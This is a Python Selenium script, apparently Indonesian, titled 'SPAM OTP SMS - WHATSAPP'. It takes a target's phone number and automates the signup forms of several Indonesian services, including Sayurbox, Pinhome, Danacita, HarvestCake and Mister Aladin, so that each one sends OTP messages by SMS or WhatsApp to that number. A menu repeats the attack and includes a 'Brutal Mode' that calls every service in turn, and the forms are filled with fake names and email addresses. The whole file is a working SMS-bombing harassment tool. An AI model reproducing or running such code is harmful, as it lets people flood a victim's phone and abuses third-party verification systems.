from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys 
from selenium.webdriver.common.by import By
import time , os ,requests ,sys
from datetime import datetime
from colorama import Fore
from selenium.webdriver.chrome.options import Options

def format_waktu_indonesia():
    sekarang = datetime.now()

    nama_bulan = {
        "January": "Januari", "February": "Februari", "March": "Maret",
        "April": "April", "May": "Mei", "June": "Juni",
        "July": "Juli", "August": "Agustus", "September": "September",
        "October": "Oktober", "November": "November", "December": "Desember"}
    
    bulan = sekarang.strftime("%B")
    bulan_indonesia = nama_bulan[bulan]
    tanggal = sekarang.strftime(f"%d {bulan_indonesia} %Y")
    sekarang.strftime(f"Jam:%H:%M:%S")
    return f"{tanggal} "

def format_jam_indonesia():
    sekarang = datetime.now()
    waktu = sekarang.strftime(f"%H:%M:%S")
    return f"{waktu} "

waktu_indonesia = format_waktu_indonesia()
jam_indonesia = format_jam_indonesia()

def format_waktu_indonesia():
    sekarang = datetime.now()
    tanggal = sekarang.strftime("%d-%m-%Y")
    return f"{tanggal}"

ip=requests.get('https://api.ipify.org').text

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

hijau="\033[0;92m"
putih="\033[0;97m"
abu="\033[0;90m"
kuning="\033[0;93m"
ungu="\033[0;95m"
merah="\033[0;91m"
biru="\033[0;96m"

def autoketik(teks, kecepatan=0.05):
    for karakter in teks:
        sys.stdout.write(karakter)
        sys.stdout.flush()
        time.sleep(kecepatan)

def tampilkan_banner():
    
    print(f"""
{putih}[{B}•{putih}] {biru}Developer{putih} : {hijau}MarshallSetian
{putih}[{B}•{putih}] {ungu}Instagram {putih}: @marshall_setian
{W}[{B}•{W}] Ip Kamu {putih}  :{Y} {ip}
{W}[{B}•{W}]{putih} Tanggal   :{merah} {waktu_indonesia}
{W}[{B}•{W}]{putih} Jam       :{biru} {jam_indonesia}""")
    banner =f"""{putih}==============================={hijau}
PROGRAM SPAM OTP SMS - WHATSAPP {putih}
===============================
"""
    print(Fore.CYAN + banner)
    #time.sleep(1)
#################################################################################
chrome_options = Options()
#chrome_options.add_argument("--headless")  # Menjalankan di mode headless
chrome_options.add_argument("--hermes-fake")
chrome_options.add_argument("--disable-dev-shm-usage")

driver_path = '/home/eng/Dokumen/chromedriver-linux64/chromedriver'
service = Service(driver_path)
driver = webdriver.Chrome(service=service,options=chrome_options)###############options=chrome_options
tampilkan_banner()
autoketik(f"{kuning}Selamat Datang Di Dunia Program Bocah Tengik Gan!{putih}\n")

nomor = input("\nMasukkan Nomer TargetMu cok (08xxxxxxxx): ")
os.system("clear")
time.sleep(2)
autoketik(f"Nomor Target Anda Saat ini : {kuning}{nomor}{putih}\n")
#target_penipu = ('0877870443711')

def  sayurbox_sms():

    dg = driver.get("https://www.sayurbox.com/auth/signup")
                    
    time.sleep(2)
    #nomor = input("masukkan no hp (62): ")
    input_element = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Masukkan Nomor Handphone..."]')
    input_element.send_keys(nomor)

    
    lanjutkan = driver.find_element(By.CSS_SELECTOR, '[data-testid="sb_btn_qa_auth_continue')
    lanjutkan.click()
    time.sleep(3)
                    
    kirim_sms = driver.find_element(By.CSS_SELECTOR, '[data-testid="sb_btn_otp_option_sms')
    kirim_sms.click()
    time.sleep(3)

    print(f"{kuning}Sukses Mengirim SMS OTP ==> SayurBox!!!{putih}")
    
def sayurbox_wa():
    
        driver.get("https://www.sayurbox.com/auth/signup")
                        
        time.sleep(2)
        input_element = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Masukkan Nomor Handphone..."]')
        input_element.send_keys(nomor)
        time.sleep(3)
        lanjutkan = driver.find_element(By.CSS_SELECTOR, '[data-testid="sb_btn_qa_auth_continue')
        lanjutkan.click()
        
        time.sleep(3)
                        
        kirim_wa = driver.find_element(By.CSS_SELECTOR, '[data-testid="sb_btn_otp_option_whatsapp')
        kirim_wa.click()
        time.sleep(3)
        print(f"{hijau}Sukses Mengirim WHATSAPP OTP ==> SayurBox!!!{putih}")
        
    

def danacita():

    driver.get("https://app.danacita.co.id/register")
    time.sleep(3)
    #nomor = input("masukkan nomor (08xxxxxxxxx): ")
    input_element = driver.find_element(By.ID, 'phone_number')
    time.sleep(3)
    input_element.send_keys(nomor)
    time.sleep(3)
    lanjutkan = driver.find_element(By.ID,'btn-form-register')
    lanjutkan.click()
    time.sleep(3)
    klikwa = driver.find_element(By.XPATH,'/html/body/div/div/div/div[2]/div/div[1]')
    klikwa.click()
    print(f"{hijau}Sukses Mengirim WHATSAPP OTP ==> DanaCita!!!{putih}")


    time.sleep(3)
    
def pinhome_sms():
    driver.get("https://www.pinhome.id/daftar")
    klik2 = driver.find_element(By.ID, 'fullname')
    time.sleep(2)
    klik1 = driver.find_element(By.ID, 'phoneNumber')
    klik2.send_keys("jono")
    klik1.send_keys(nomor)
    time.sleep(3)
    reg = driver.find_element(By.ID ,'customer-register')
    reg.click()
    time.sleep(1)
    spam_wa = driver.find_element(By.CSS_SELECTOR, '[data-testid="btn-messages"')
    spam_wa.click()
    time.sleep(3)
    print(f"{kuning}Sukses Mengirim SMS OTP ==> PinHome!!!{putih}")

def pinhome_wa():
    driver.get("https://www.pinhome.id/daftar")
    klik2 = driver.find_element(By.ID, 'fullname')
    time.sleep(2)
    klik1 = driver.find_element(By.ID, 'phoneNumber')
    klik2.send_keys("jono")
    klik1.send_keys(nomor)
    time.sleep(3)
    reg = driver.find_element(By.ID ,'customer-register')
    reg.click()
    time.sleep(1)
    spam_wa = driver.find_element(By.CSS_SELECTOR, '[data-testid="btn-whatsapp"')
    spam_wa.click()
    time.sleep(2)
    print(f"{hijau}Sukses Mengirim WHATSAPP OTP ==> PinHome!!!{putih}")

def harvestcake():
    driver.get("https://harvestcakes.com/register/")
    no = driver.find_element(By.ID,'id_mobile_number')
    no.send_keys(nomor)
    checkbox = driver.find_element(By.ID,'id_toc')
    checkbox.click()
    reg = driver.find_element(By.XPATH,'/html/body/div[2]/div[1]/form/div[2]/button')
    reg.click()
    time.sleep(2)
    print(f"{hijau}Sukses Mengirim WHATSAPP OTP ==> HarvestCake!!!{putih}")
    time.sleep(3)

def mraladin():
    driver.get("https://www.misteraladin.com/register")
    username = driver.find_element(By.ID,'fullname')
    username.send_keys("yuli astuti")
    email = driver.find_element(By.ID,'email')
    email.send_keys("yuliastuti@gmail.com")
    nomer = driver.find_element(By.ID,'phone_number_phone_number')
    nomer.send_keys(nomor)
    checkbox = driver.find_element(By.ID,'termconditions')
    checkbox.click()
    lanjut = driver.find_element(By.XPATH,'//*[@id="page-phone-otp"]/div/div/div/div/div/div/span/form/button')
    lanjut.click()
    time.sleep(3)
    print(f"{hijau}Sukses Mengirim WHATSAPP OTP ==> Mr.Aladin!!!{putih}")

#lanjut


def pilihan():

    while True:
        autoketik("\nSilahkan Masukkan Pilihan :\n\n")
        print("Pilih 1 ==> Kirim spam SMS")
        print("Pilih 2 ==> Kirim spam WA")
        print("Pilih 3 ==> Brutal Mode x Random")

        print(f"\nExit : {merah}(Ctrl+z){putih}\n")

        user_input = input("Masukkan Pilihan Dengan Angka : ")

        if user_input == "1":
            autoketik(f"\n{B}Sedang mencoba kirim pesan OTP!!!\n{putih}")
            pinhome_sms()
            sayurbox_sms()
            os.system("clear")
            tampilkan_banner()

        elif user_input == "2":
            autoketik(f"\n{B}sedang mencoba kirim Whatsapp OTP!!!\n{putih}")
            pinhome_wa()
            sayurbox_wa()
            mraladin()
            danacita()
            harvestcake()
            os.system("clear")
            tampilkan_banner()

        elif user_input == "3":
            autoketik(f"\n{B}Mode Brutal Diaktifkan...!!!\n{putih}")
            pinhome_sms()
            sayurbox_sms()
            danacita()
            harvestcake()
            pinhome_wa()
            sayurbox_wa()
            mraladin()
            harvestcake()
            os.system("clear")
            tampilkan_banner()
            

        else:
            time.sleep(1)
            autoketik(f"{merah}Lebokke Nomer Sing Benerlah Cok!!!!{putih}")
            time.sleep(3)
            os.system("clear")
            autoketik(f"Nomor Target Anda Saat ini : {kuning}{nomor}{putih}\n")
            
            #return pilihan()

        continue

pilihan()


